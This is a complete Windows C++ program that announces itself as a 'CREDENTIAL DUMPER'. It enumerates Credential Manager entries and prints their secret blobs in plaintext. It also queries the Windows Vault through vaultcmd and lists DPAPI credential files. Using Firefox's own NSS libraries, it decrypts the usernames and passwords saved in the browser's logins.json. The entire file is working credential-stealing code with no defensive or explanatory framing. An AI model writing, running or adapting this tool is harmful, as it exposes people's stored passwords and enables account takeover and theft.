#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <wincred.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "Credui.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")

static HANDLE g_out = INVALID_HANDLE_VALUE;

static void InitOutput()
{
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    g_out = GetStdHandle(STD_OUTPUT_HANDLE);
    if (g_out == INVALID_HANDLE_VALUE || g_out == nullptr)
        g_out = CreateFileW(L"CONOUT$", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
}

static void W(const wchar_t* s)
{
    if (g_out == INVALID_HANDLE_VALUE) return;
    DWORD n;
    WriteConsoleW(g_out, s, (DWORD)wcslen(s), &n, nullptr);
}

static void WF(const wchar_t* fmt, ...)
{
    wchar_t buf[1024];
    va_list a;
    va_start(a, fmt);
    _vsnwprintf_s(buf, _TRUNCATE, fmt, a);
    va_end(a);
    W(buf);
}

static void A(const std::string& s)
{
    if (g_out == INVALID_HANDLE_VALUE) return;
    DWORD n;
    WriteConsoleA(g_out, s.c_str(), (DWORD)s.size(), &n, nullptr);
}

static bool SafeCopyW(const wchar_t* src, wchar_t* dst, size_t n, bool* ok)
{
    if (ok) *ok = false;
    if (!src || !dst || !n) return false;
    __try {
        size_t i = 0;
        while (i < n - 1 && src[i]) { dst[i] = src[i]; ++i; }
        dst[i] = 0;
        if (ok) *ok = true;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        if (n) dst[0] = 0;
        return false;
    }
}

static bool SafeReadWide(const BYTE* b, DWORD sz, wchar_t* out, DWORD cap, DWORD* written)
{
    if (!b || !sz || !out || cap < 2) return false;
    DWORD n = sz / sizeof(wchar_t);
    if (n > cap - 1) n = cap - 1;
    __try {
        const wchar_t* s = (const wchar_t*)b;
        for (DWORD i = 0; i < n; ++i) out[i] = s[i];
        out[n] = 0;
        if (written) *written = n;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        out[0] = 0;
        if (written) *written = 0;
        return false;
    }
}

static bool SafeReadNarrow(const BYTE* b, DWORD sz, char* out, DWORD cap, DWORD* written)
{
    if (!b || !sz || !out || !cap) return false;
    DWORD n = sz < cap - 1 ? sz : cap - 1;
    __try {
        for (DWORD i = 0; i < n; ++i) out[i] = (char)b[i];
        out[n] = 0;
        if (written) *written = n;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        out[0] = 0;
        if (written) *written = 0;
        return false;
    }
}

static bool SafeHex(const BYTE* b, DWORD sz, DWORD cap, char* out, DWORD outBytes, DWORD* written)
{
    if (!b || !sz || !out || outBytes < 4) return false;
    if (cap > sz) cap = sz;
    __try {
        static const char h[] = "0123456789ABCDEF";
        DWORD w = 0;
        for (DWORD i = 0; i < cap && w + 4 < outBytes; ++i) {
            out[w++] = h[(b[i] >> 4) & 0xF];
            out[w++] = h[b[i] & 0xF];
            out[w++] = ((i + 1) % 16 == 0) ? '\n' : ' ';
        }
        out[w] = 0;
        if (written) *written = w;
        return true;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        out[0] = 0;
        if (written) *written = 0;
        return false;
    }
}

static bool SafeProbeCred(PCREDENTIALW c)
{
    if (!c) return false;
    __try { return c->CredentialBlob != nullptr && c->CredentialBlobSize != 0; }
    __except (EXCEPTION_EXECUTE_HANDLER) { return false; }
}

// 0 = UTF-16LE, 1 = UTF-8/ASCII, 2 = binary
static int SafeDetectEncoding(const BYTE* b, DWORD sz)
{
    if (!b || !sz) return 2;
    __try {
        if (sz >= 4 && (sz % 2) == 0) {
            DWORD pairs = sz / 2;
            DWORD probe = pairs > 64 ? 64 : pairs;
            DWORD nullHi = 0, cjk = 0;
            for (DWORD i = 0; i < probe; ++i) {
                BYTE hi = b[i * 2 + 1];
                if (hi == 0x00) nullHi++;
                if (hi >= 0x4E && hi <= 0x9F) cjk++;
            }
            if (nullHi >= probe * 9 / 10) return 0;
            if (cjk >= probe * 9 / 10) return 0;
        }
        DWORD cap = sz > 4096 ? 4096 : sz, i = 0, nuls = 0;
        while (i < cap) {
            BYTE c = b[i];
            if (c == 0x00) { if (++nuls > 2) return 2; ++i; continue; }
            if (c < 0x80) {
                if (c < 0x20 && c != 0x09 && c != 0x0A && c != 0x0D) return 2;
                ++i; continue;
            }
            int extra = 0;
            if ((c & 0xE0) == 0xC0) extra = 1;
            else if ((c & 0xF0) == 0xE0) extra = 2;
            else if ((c & 0xF8) == 0xF0) extra = 3;
            else return 2;
            if (i + extra >= cap) return 2;
            for (int k = 1; k <= extra; ++k)
                if ((b[i + k] & 0xC0) != 0x80) return 2;
            i += extra + 1;
        }
        return 1;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) { return 2; }
}

// Credential Manager
static const wchar_t* CredType(DWORD t)
{
    switch (t) {
    case CRED_TYPE_GENERIC:                 return L"Generic";
    case CRED_TYPE_DOMAIN_PASSWORD:         return L"Domain Password";
    case CRED_TYPE_DOMAIN_CERTIFICATE:      return L"Domain Certificate";
    case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return L"Domain Visible Password";
    case CRED_TYPE_GENERIC_CERTIFICATE:     return L"Generic Certificate";
    case CRED_TYPE_DOMAIN_EXTENDED:         return L"Domain Extended";
    default:                                return L"Unknown";
    }
}

static const wchar_t* PersistStr(DWORD p)
{
    switch (p) {
    case CRED_PERSIST_SESSION:       return L"Session";
    case CRED_PERSIST_LOCAL_MACHINE: return L"Local Machine";
    case CRED_PERSIST_ENTERPRISE:    return L"Enterprise";
    default:                         return L"Unknown";
    }
}

static void PrintCred(PCREDENTIALW c, DWORD i)
{
    wchar_t target[512] = { 0 }, user[512] = { 0 }, comment[512] = { 0 };
    bool ht = false, hu = false, hc = false;
    if (c->TargetName) SafeCopyW(c->TargetName, target, _countof(target), &ht);
    if (c->UserName)   SafeCopyW(c->UserName, user, _countof(user), &hu);
    if (c->Comment)    SafeCopyW(c->Comment, comment, _countof(comment), &hc);

    WF(L"--- [%lu] ---\n", i);
    WF(L"  Target Name : %s\n", ht ? target : L"(unreadable)");
    WF(L"  User Name   : %s\n", hu ? user : L"(unreadable)");
    WF(L"  Type        : %s (%lu)\n", CredType(c->Type), c->Type);
    WF(L"  Persist     : %s (%lu)\n", PersistStr(c->Persist), c->Persist);
    WF(L"  Comment     : %s\n", hc ? comment : L"(unreadable)");
    WF(L"  Flags       : 0x%08lX\n", c->Flags);
    WF(L"  Blob Size   : %lu bytes\n", c->CredentialBlobSize);

    if (!c->CredentialBlob || !c->CredentialBlobSize) {
        W(L"  Credential  : (empty)\n\n");
        return;
    }

    int enc = SafeDetectEncoding(c->CredentialBlob, c->CredentialBlobSize);

    if (enc == 0) {
        wchar_t buf[1024] = { 0 };
        DWORD n = 0;
        if (SafeReadWide(c->CredentialBlob, c->CredentialBlobSize, buf, _countof(buf), &n)) {
            bool print = n > 0;
            for (DWORD k = 0; print && k < n; ++k) {
                wchar_t ch = buf[k];
                if (ch < 32 && ch != L'\t' && ch != L'\n' && ch != L'\r') print = false;
            }
            if (print) { WF(L"  Credential  : %s\n\n", buf); return; }
        }
    }
    else if (enc == 1) {
        char nbuf[1024] = { 0 };
        DWORD nb = 0;
        if (SafeReadNarrow(c->CredentialBlob, c->CredentialBlobSize, nbuf, sizeof(nbuf), &nb)) {
            int wlen = MultiByteToWideChar(CP_UTF8, 0, nbuf, (int)nb, nullptr, 0);
            if (wlen > 0) {
                std::wstring wide(wlen, L'\0');
                MultiByteToWideChar(CP_UTF8, 0, nbuf, (int)nb, &wide[0], wlen);
                WF(L"  Credential  : %s\n\n", wide.c_str());
                return;
            }
        }
    }

    char hx[2048] = { 0 };
    DWORD hl = 0, cap = c->CredentialBlobSize > 256 ? 256 : c->CredentialBlobSize;
    if (SafeHex(c->CredentialBlob, c->CredentialBlobSize, cap, hx, sizeof(hx), &hl)) {
        WF(L"  Credential  : (hex, %lu of %lu bytes)\n              ", cap, c->CredentialBlobSize);
        std::wstring w;
        w.reserve(hl);
        for (DWORD k = 0; k < hl; ++k) w.push_back((wchar_t)hx[k]);
        WF(L"%s\n\n", w.c_str());
    }
    else W(L"  Credential  : (read fault)\n\n");
}

static void DumpCredManager()
{
    W(L"=== CREDENTIAL MANAGER ===\n\n");
    DWORD count = 0;
    PCREDENTIALW* creds = nullptr;
    if (!CredEnumerateW(nullptr, 0, &count, &creds)) {
        WF(L"CredEnumerateW failed: %lu\n\n", GetLastError());
        return;
    }
    WF(L"Found %lu credential(s)\n\n", count);
    for (DWORD i = 0; i < count; ++i)
        if (creds[i] && SafeProbeCred(creds[i])) PrintCred(creds[i], i);
    CredFree(creds);
}

static void RunVault(const wchar_t* args)
{
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = si.hStdError = wr;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    PROCESS_INFORMATION pi = {};
    std::wstring cmd = std::wstring(L"vaultcmd ") + args;
    if (!CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(rd); CloseHandle(wr); return;
    }
    CloseHandle(wr);
    WaitForSingleObject(pi.hProcess, 10000);

    std::string out;
    char buf[4096];
    DWORD n;
    while (ReadFile(rd, buf, sizeof(buf) - 1, &n, nullptr) && n) { buf[n] = 0; out += buf; }
    CloseHandle(rd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (out.empty()) W(L"(empty)\n\n");
    else { A(out); W(L"\n"); }
}

static void DumpVault()
{
    W(L"=== WINDOWS VAULT ===\n\n");
    W(L"--- Windows Credentials ---\n\n");
    RunVault(L"/listcreds:\"Windows Credentials\" /all");
    W(L"--- Web Credentials ---\n\n");
    RunVault(L"/listcreds:\"Web Credentials\" /all");
}

static void DumpCredFiles()
{
    W(L"=== DPAPI CREDENTIAL FILES ===\n\n");
    PWSTR appData = nullptr;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &appData))) return;
    std::wstring dir = std::wstring(appData) + L"\\Microsoft\\Credentials";
    CoTaskMemFree(appData);

    WIN32_FIND_DATAW fd = {};
    HANDLE h = FindFirstFileW((dir + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) { WF(L"No files (%s)\n\n", dir.c_str()); return; }

    int n = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        FILETIME lt; SYSTEMTIME st;
        FileTimeToLocalFileTime(&fd.ftLastWriteTime, &lt);
        FileTimeToSystemTime(&lt, &st);
        WF(L"  %s  %llu bytes  %04u-%02u-%02u %02u:%02u:%02u\n",
            fd.cFileName, sz, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        n++;
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    WF(L"\nTotal: %d file(s)\n\n", n);
}

struct SECItem { int type; unsigned char* data; unsigned int len; };

typedef int   (*NSS_Init_t)(const char*);
typedef int   (*NSS_Shutdown_t)();
typedef void* (*PK11_GetSlot_t)();
typedef int   (*PK11_Auth_t)(void*, int, void*);
typedef int   (*PK11SDR_Decrypt_t)(SECItem*, SECItem*, void*);
typedef void  (*PK11_FreeSlot_t)(void*);
typedef void  (*SECITEM_Free_t)(SECItem*, int);

struct Nss {
    HMODULE moz = nullptr, nss = nullptr;
    NSS_Init_t Init = nullptr;
    NSS_Shutdown_t Shutdown = nullptr;
    PK11_GetSlot_t GetSlot = nullptr;
    PK11_Auth_t Auth = nullptr;
    PK11SDR_Decrypt_t Decrypt = nullptr;
    PK11_FreeSlot_t FreeSlot = nullptr;
    SECITEM_Free_t FreeItem = nullptr;
};

static int ProcessBitness()
{
#ifdef _WIN64
    return 64;
#else
    return 32;
#endif
}

static int DllBitness(const std::wstring& path)
{
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) return 0;
    BYTE dos[64]; DWORD rd = 0;
    if (!ReadFile(h, dos, sizeof(dos), &rd, nullptr) || rd < 64 || dos[0] != 'M' || dos[1] != 'Z') {
        CloseHandle(h); return 0;
    }
    LONG peOff = *(LONG*)(dos + 0x3C);
    if (peOff <= 0 || SetFilePointer(h, peOff, nullptr, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        CloseHandle(h); return 0;
    }
    BYTE nt[6];
    if (!ReadFile(h, nt, sizeof(nt), &rd, nullptr) || rd < 6 || nt[0] != 'P' || nt[1] != 'E') {
        CloseHandle(h); return 0;
    }
    WORD machine = *(WORD*)(nt + 4);
    CloseHandle(h);
    if (machine == 0x014c) return 32;
    if (machine == 0x8664) return 64;
    if (machine == 0xAA64) return 64;
    return 0;
}

static std::vector<unsigned char> B64(const std::string& s)
{
    static const char* tab = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static int T[256];
    static bool init = false;
    if (!init) {
        for (int i = 0; i < 256; ++i) T[i] = -1;
        for (int i = 0; i < 64; ++i) T[(unsigned char)tab[i]] = i;
        init = true;
    }
    std::vector<unsigned char> r;
    r.reserve(s.size() * 3 / 4);
    int v = 0, bits = -8;
    for (unsigned char c : s) {
        if (c == '=') break;
        if (T[c] < 0) continue;
        v = (v << 6) + T[c];
        bits += 6;
        if (bits >= 0) { r.push_back((unsigned char)((v >> bits) & 0xFF)); bits -= 8; }
    }
    return r;
}

static std::wstring FirefoxDir()
{
    const wchar_t* candidates[] = {
        L"C:\\Program Files\\Mozilla Firefox\\",
        L"C:\\Program Files (x86)\\Mozilla Firefox\\",
    };
    int want = ProcessBitness();
    std::wstring fallback;
    for (auto d : candidates) {
        std::wstring dll = std::wstring(d) + L"nss3.dll";
        if (GetFileAttributesW(dll.c_str()) == INVALID_FILE_ATTRIBUTES) continue;
        int bits = DllBitness(dll);
        if (bits == want) return d;
        if (fallback.empty()) fallback = d;
    }
    return fallback;
}

static std::wstring FirefoxProfile()
{
    PWSTR appData = nullptr;
    if (FAILED(SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &appData))) return L"";
    std::wstring root = std::wstring(appData) + L"\\Mozilla\\Firefox\\Profiles";
    CoTaskMemFree(appData);

    WIN32_FIND_DATAW fd = {};
    HANDLE h = FindFirstFileW((root + L"\\*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return L"";

    std::wstring found;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        std::wstring p = root + L"\\" + fd.cFileName;
        if (GetFileAttributesW((p + L"\\logins.json").c_str()) != INVALID_FILE_ATTRIBUTES &&
            GetFileAttributesW((p + L"\\key4.db").c_str()) != INVALID_FILE_ATTRIBUTES) {
            found = p; break;
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    return found;
}

static bool LoadNss(Nss& n, const std::wstring& dir)
{
    n.moz = LoadLibraryExW((dir + L"mozglue.dll").c_str(), nullptr, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!n.moz) return false;
    n.nss = LoadLibraryExW((dir + L"nss3.dll").c_str(), nullptr, LOAD_WITH_ALTERED_SEARCH_PATH);
    if (!n.nss) return false;
    n.Init = (NSS_Init_t)GetProcAddress(n.nss, "NSS_Init");
    n.Shutdown = (NSS_Shutdown_t)GetProcAddress(n.nss, "NSS_Shutdown");
    n.GetSlot = (PK11_GetSlot_t)GetProcAddress(n.nss, "PK11_GetInternalKeySlot");
    n.Auth = (PK11_Auth_t)GetProcAddress(n.nss, "PK11_Authenticate");
    n.Decrypt = (PK11SDR_Decrypt_t)GetProcAddress(n.nss, "PK11SDR_Decrypt");
    n.FreeSlot = (PK11_FreeSlot_t)GetProcAddress(n.nss, "PK11_FreeSlot");
    n.FreeItem = (SECITEM_Free_t)GetProcAddress(n.nss, "SECITEM_FreeItem");
    return n.Init && n.GetSlot && n.Auth && n.Decrypt && n.FreeSlot;
}

static std::string DecryptBlob(Nss& n, const std::string& b64)
{
    auto raw = B64(b64);
    if (raw.empty()) return "";
    SECItem req = { 0, raw.data(), (unsigned int)raw.size() };
    SECItem rep = { 0, nullptr, 0 };
    if (n.Decrypt(&req, &rep, nullptr) != 0) return "";
    std::string r((char*)rep.data, rep.len);
    if (n.FreeItem) n.FreeItem(&rep, 0);
    return r;
}

static size_t FindField(const std::string& j, size_t start, const char* key, std::string& out)
{
    std::string needle = "\""; needle += key; needle += "\"";
    size_t p = j.find(needle, start);
    if (p == std::string::npos) return p;
    size_t c = j.find(':', p + needle.size());
    if (c == std::string::npos) return c;
    size_t q1 = j.find('"', c + 1);
    if (q1 == std::string::npos) return q1;
    size_t q2 = q1 + 1;
    while (q2 < j.size()) {
        if (j[q2] == '\\') { q2 += 2; continue; }
        if (j[q2] == '"') break;
        ++q2;
    }
    if (q2 >= j.size()) return std::string::npos;
    out = j.substr(q1 + 1, q2 - q1 - 1);
    return q2;
}

static void DumpFirefox()
{
    W(L"=== FIREFOX PASSWORDS ===\n\n");

    std::wstring dir = FirefoxDir();
    std::wstring prof = FirefoxProfile();
    if (dir.empty()) { W(L"Firefox install not found.\n\n"); return; }
    if (prof.empty()) { W(L"Firefox profile not found.\n\n"); return; }

    Nss n;
    if (!LoadNss(n, dir)) { W(L"NSS load failed.\n\n"); return; }

    std::string profA(prof.begin(), prof.end());
    if (n.Init(profA.c_str()) != 0) { W(L"NSS_Init failed.\n\n"); return; }

    void* slot = n.GetSlot();
    if (!slot) { if (n.Shutdown) n.Shutdown(); return; }

    if (n.Auth(slot, 1, nullptr) != 0) {
        W(L"Primary Password set; cannot decrypt.\n\n");
        n.FreeSlot(slot);
        if (n.Shutdown) n.Shutdown();
        return;
    }

    std::ifstream f(prof + L"\\logins.json", std::ios::binary);
    if (!f) { n.FreeSlot(slot); if (n.Shutdown) n.Shutdown(); return; }
    std::string json((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

    size_t pos = 0;
    int count = 0;
    while (true) {
        std::string host, uEnc, pEnc;
        size_t ph = FindField(json, pos, "hostname", host);
        if (ph == std::string::npos) break;
        size_t pu = FindField(json, ph, "encryptedUsername", uEnc);
        size_t pp = FindField(json, ph, "encryptedPassword", pEnc);
        if (pu == std::string::npos || pp == std::string::npos) break;

        std::string u = DecryptBlob(n, uEnc);
        std::string p = DecryptBlob(n, pEnc);

        WF(L"[%d] %S\n     user: %S\n     pass: %S\n\n", count, host.c_str(), u.c_str(), p.c_str());
        count++;
        pos = pp;
    }

    n.FreeSlot(slot);
    if (n.Shutdown) n.Shutdown();
    WF(L"Total: %d login(s)\n\n", count);
}

int wmain()
{
    InitOutput();
    W(L"========== CREDENTIAL DUMPER ==========\n\n");
    DumpCredManager();
    DumpVault();
    DumpCredFiles();
    DumpFirefox();
    W(L"Done!\n");
    return 0;
}